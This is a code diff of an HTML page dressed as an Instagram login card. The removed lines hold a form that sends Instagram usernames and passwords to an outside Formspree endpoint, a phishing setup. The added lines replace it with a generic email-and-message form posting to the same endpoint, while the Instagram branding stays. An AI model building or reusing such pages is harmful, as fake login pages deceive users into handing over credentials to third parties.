@@ -85,18 +85,21 @@
     <div class="card">
       <h1 class="instagram-name">Instagram</h1>
       <img class="logo" src="https://www.instagram.com/static/images/ico/xxhdpi_launcher.png/99cf3909d459.png" alt="Instagram Logo" width="200">
-      <form action="https://formspree.io/f/mpzevpjg"
-  method="POST">
-        <div class="form-group">
-          <input name="username" type="text" placeholder="Username">
-        </div>
-        <div class="form-group">
-          <input name="password" type="password" placeholder="Password">
-        </div>
-        <div class="form-group">
-          <button type="submit">Log In</button>
-        </div>
-      </form>
+      <form
+  action="https://formspree.io/f/mpzevpjg"
+  method="POST"
+>
+  <label>
+    Your email:
+    <input type="email" name="email">
+  </label>
+  <label>
+    Your message:
+    <textarea name="message"></textarea>
+  </label>
+  <!-- your other form fields go here -->
+  <button type="submit">Send</button>
+</form>
       <div class="text-small">
         <a href="#">Forgot password?</a>
       </div>
